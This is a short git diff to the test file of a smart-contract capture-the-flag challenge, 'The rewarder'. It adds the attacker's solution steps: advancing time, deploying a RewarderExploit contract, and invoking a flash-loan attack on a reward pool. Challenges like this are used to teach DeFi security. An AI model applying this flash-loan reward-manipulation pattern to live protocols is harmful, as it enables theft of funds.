@@ -61,6 +61,11 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        await time.increase(time.duration.days(5));
+
+        const RewarderExploit = contract.fromArtifact('RewarderExploit');
+        this.exploit = await RewarderExploit.new({ from: attacker });
+        await this.exploit.exploit(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL, this.rewarderPool.address, this.rewardToken.address, this.liquidityToken.address, {from: attacker});
     });
 
     after(async function () {
